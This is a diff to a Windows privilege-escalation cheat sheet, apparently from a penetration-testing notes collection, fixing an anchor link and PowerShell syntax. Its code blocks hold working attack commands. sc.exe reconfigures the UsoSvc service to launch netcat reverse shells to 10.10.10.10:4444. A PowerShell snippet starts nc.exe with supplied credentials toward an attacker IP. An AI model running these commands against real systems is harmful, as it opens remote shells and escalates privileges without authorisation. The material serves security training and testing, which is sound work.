@@ -12,7 +12,7 @@
     * [Search for file contents](#search-for-file-contents)
     * [Search for a file with a certain filename](#search-for-a-file-with-a-certain-filename)
     * [Search the registry for key names and passwords](#search-the-registry-for-key-names-and-passwords)
-    * [Passwords in unattend.xml](#passwords-in-unattend.xml)
+    * [Passwords in unattend.xml](#passwords-in-unattendxml)
     * [Wifi passwords](#wifi-passwords)
     * [Passwords stored in services](#passwords-stored-in-services)
     * [Powershell history](#powershell-history)
@@ -519,9 +519,9 @@ Prerequisite: Service account
 
 ```powershell
 PS C:\Windows\system32> sc.exe stop UsoSvc
-PS C:\Windows\system32> sc.exe config UsoSvc binPath="cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\a.txt"
 PS C:\Windows\system32> sc.exe config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 10.10.10.10 4444 -e cmd.exe"
 PS C:\Windows\system32> sc.exe config UsoSvc binpath= "C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe"
+PS C:\Windows\system32> sc.exe config UsoSvc binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
 PS C:\Windows\system32> sc.exe qc usosvc
 [SC] QueryServiceConfig SUCCESS
 
@@ -712,9 +712,9 @@ C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\us
 ```
 
 ```powershell
-$ secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
-$ mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
-$ computer = "<hostname>"
+$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
+$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
+$computer = "<hostname>"
 [System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
 ```
 
